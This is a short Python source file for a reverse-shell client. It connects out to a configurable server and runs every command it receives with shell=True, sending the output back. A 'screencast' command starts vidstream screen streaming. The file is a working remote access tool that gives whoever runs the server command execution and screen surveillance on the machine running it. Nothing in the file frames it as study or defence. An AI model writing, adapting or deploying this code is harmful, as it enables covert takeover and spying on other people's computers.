import socket
import subprocess
from vidstream import ScreenShareClient
def connect(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        return s
    except Exception as e:
        print("[-] Connection failed:", e)
        return None

def execute_commands(s):
    while True:
        command = s.recv(1024).decode()
        if 'exit' in command.lower():
            s.close()
            break

        elif 'screencast' in command.lower():
            # Start the screen streamer
            start_screencast(s)
        
        else:
            try:
                # Run the command
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                # If there's no output, send a default message
                if not output:
                    output = b'Command executed successfully, but there is no output.'
                s.sendall(output)
            except subprocess.CalledProcessError as e:
                # If the command fails, send the error output
                s.sendall(e.output)
            except Exception as e:
                # Handle other exceptions
                s.sendall(str(e).encode())

def start_screencast(s):
    # Create a screen streamer
    streamer = ScreenShareClient("127.0.0.1",11111)

    # Start streaming
    streamer.start_stream()

if __name__ == "__main__":
    ip = "127.0.0.1"  # Replace with the actual server IP
    port = 12345
    s = connect(ip, port)
    if s:
        execute_commands(s)
